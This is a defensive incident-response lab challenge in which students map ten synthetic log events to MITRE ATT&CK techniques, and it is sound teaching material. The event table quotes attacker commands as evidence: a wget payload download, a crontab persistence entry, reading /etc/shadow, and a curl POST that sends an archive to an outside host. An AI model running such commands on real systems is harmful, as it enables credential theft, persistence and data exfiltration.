# Challenge 1 — MITRE ATT&CK Mapping from Evidence Pointers

> Estimated time: 90-120 minutes.
> Prerequisite: Exercises 1-4 completed; Lectures 1-3 read; the lab artefacts have been triaged.
> Output: a Markdown table that maps every observed event in the lab to one or more MITRE ATT&CK techniques, with an evidence pointer for each.

---

## Why this challenge

The ATT&CK mapping is the lingua franca for sharing an incident with peer organisations, government partners, and the broader defender community. The IR report is the artefact whose ATT&CK map is the most-read appendix. Mapping is also the discipline that exposes gaps in the timeline: if an observed event cannot be mapped to an ATT&CK technique, the analyst usually finds that they have either misread the event or are missing a piece of context.

The mini-project requires the full map. This challenge is a *focussed* mapping exercise: take a curated subset of the lab's events and produce the high-quality mapping table that the mini-project will then extend.

---

## Authorised use

The events you will map are bundled with this week's mini-project starter directory and are entirely synthetic. The technique IDs you cite are from the public MITRE ATT&CK framework at <https://attack.mitre.org/>. Do not extend this exercise to any production-host log without the authorisation that the README's banner requires.

---

## Provided

This challenge gives you a curated list of ten events drawn from the lab timeline. Your task is to produce the mapping table. The list:

| # | Time (UTC) | Source | Observed event |
|---|---|---|---|
| 1 | 2026-05-14T02:46:14Z | nginx | `GET /admin/login.php` from `198.51.100.7`, UA `zgrab/0.x`, status `404` |
| 2 | 2026-05-14T02:46:35Z | nginx | `GET /.env` from `198.51.100.7`, status `404` |
| 3 | 2026-05-14T02:46:36Z | nginx | `GET /.git/HEAD` from `198.51.100.7`, status `200` |
| 4 | 2026-05-14T02:46:58Z | auth.log | `sshd: Accepted publickey for deploy from 198.51.100.7` |
| 5 | 2026-05-14T02:47:32Z | auth.log | `sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash` |
| 6 | 2026-05-14T02:47:34Z | bash-history | `wget http://198.51.100.7/payload -O /tmp/x` |
| 7 | 2026-05-14T02:48:02Z | auth.log | `useradd: new user: name=support, UID=1099, GID=1099` |
| 8 | 2026-05-14T02:48:33Z | bash-history | `echo '*/5 * * * * /tmp/.x' \| crontab -u support -` |
| 9 | 2026-05-14T02:49:15Z | bash-history | `cat /etc/shadow > /tmp/sh.out` |
| 10 | 2026-05-14T02:49:40Z | bash-history | `curl -X POST --data-binary @/tmp/d.tar.gz https://198.51.100.7:8443/` |

---

## Task

Produce a Markdown table with the following columns:

- **Time (UTC)** — copy from the input.
- **Observed event** — copy from the input.
- **Tactic** — the ATT&CK tactic name (e.g. *Initial Access*, *Execution*).
- **Technique ID** — the canonical ATT&CK technique ID (e.g. `T1078`) with a hyperlink to the MITRE page.
- **Sub-technique ID** — if applicable, the sub-technique ID and hyperlink.
- **Confidence** — *high*, *medium*, or *low* (high if the observation directly evidences the technique; medium if it is consistent with the technique but other interpretations exist; low if it could be benign).
- **Evidence pointer** — a string the report can resolve back to the source artefact (e.g. `auth.log:14` for line 14 of the auth.log file).

For each event, record at least one technique. Several events legitimately map to more than one technique; record the strongest mapping in the *Technique ID* column and any secondaries in a *Notes* column.

Add a **Notes** column. Use it to:

- Justify the choice when the technique is non-obvious.
- Flag any event that has multiple plausible technique mappings.
- Identify the *tactic* the event advances even when the *technique* mapping is uncertain.

---

## Validation rubric

A mapping is good if it satisfies all of:

- **Every event is mapped** to at least one technique. *Unmapped* is not an acceptable state; if you cannot map an event, the right response is to label the event as "tactic uncertain — provisional mapping to T1078 (Valid Accounts) pending further analysis", not to leave the row empty.
- **Sub-techniques are cited** where the framework supplies one. `T1059` alone is weaker than `T1059.004` (Unix Shell).
- **Confidence levels are honest.** A `high` confidence on every row is the canonical signature of someone who has not thought carefully. Real maps have a distribution of confidences; review your own for honesty.
- **Evidence pointers resolve.** If you write `auth.log:14`, line 14 of the lab's auth.log must indeed be the event you cited. If you write `bash-history:6`, line 6 of the bash_history file must indeed be that command.
- **Hyperlinks point to the canonical MITRE page.** Use `https://attack.mitre.org/techniques/TXXXX/` (or `TXXXX/NNN/` for sub-techniques). Do not link to secondary sources.

---

## Stretch — defensive countermeasure mapping

For each technique you cite, the MITRE ATT&CK page lists *Mitigations* and *Detections*. Pick one mitigation and one detection per row, and add two columns to your table:

- **Mitigation** — the canonical ID and short name (e.g. `M1032 Multi-factor Authentication`).
- **Detection** — the canonical ID and short name (e.g. `DS0028 Logon Session`).

The mitigation-and-detection columns are what an engineering team will read when deciding what to build. The mini-project's lessons-learned section is most useful when each finding has both columns populated.

---

## Deliverable

Commit the mapping table to this file's `Appendix A` (below). The mini-project will then extend the table to cover every event in the timeline, not just these ten.

---

## Appendix A — Your mapping table

(Replace the placeholder rows below.)

| # | Time (UTC) | Observed event | Tactic | Technique ID | Sub-technique | Confidence | Evidence pointer | Notes |
|---|---|---|---|---|---|---|---|---|
| 1 | 2026-05-14T02:46:14Z | GET /admin/login.php (zgrab) | _______ | [____](https://attack.mitre.org/techniques/____/) | _______ | _______ | nginx-access:_ | _______ |
| 2 | 2026-05-14T02:46:35Z | GET /.env | _______ | [____](https://attack.mitre.org/techniques/____/) | _______ | _______ | nginx-access:_ | _______ |
| 3 | 2026-05-14T02:46:36Z | GET /.git/HEAD (200) | _______ | [____](https://attack.mitre.org/techniques/____/) | _______ | _______ | nginx-access:_ | _______ |
| 4 | 2026-05-14T02:46:58Z | Accepted publickey for deploy | _______ | [____](https://attack.mitre.org/techniques/____/) | _______ | _______ | auth.log:_ | _______ |
| 5 | 2026-05-14T02:47:32Z | sudo to root | _______ | [____](https://attack.mitre.org/techniques/____/) | _______ | _______ | auth.log:_ | _______ |
| 6 | 2026-05-14T02:47:34Z | wget /tmp/x | _______ | [____](https://attack.mitre.org/techniques/____/) | _______ | _______ | bash-history:_ | _______ |
| 7 | 2026-05-14T02:48:02Z | useradd support | _______ | [____](https://attack.mitre.org/techniques/____/) | _______ | _______ | auth.log:_ | _______ |
| 8 | 2026-05-14T02:48:33Z | crontab -u support | _______ | [____](https://attack.mitre.org/techniques/____/) | _______ | _______ | bash-history:_ | _______ |
| 9 | 2026-05-14T02:49:15Z | cat /etc/shadow | _______ | [____](https://attack.mitre.org/techniques/____/) | _______ | _______ | bash-history:_ | _______ |
| 10 | 2026-05-14T02:49:40Z | curl POST exfil | _______ | [____](https://attack.mitre.org/techniques/____/) | _______ | _______ | bash-history:_ | _______ |

---

## Self-check before commit

- [ ] Every row in Appendix A is populated.
- [ ] Every technique-ID cell has a hyperlink to the MITRE page.
- [ ] At least three rows use a sub-technique (e.g. `T1003.008`).
- [ ] Confidences include at least one `medium` (every row at `high` is suspect).
- [ ] Every evidence pointer references a specific line in a specific source.

When all five are true, commit. The reference mapping is in the mini-project's solution narrative (`mini-project/SOLUTION_NARRATIVE.md` becomes visible after the mini-project deadline); for the challenge, your own defensible mapping is the deliverable.
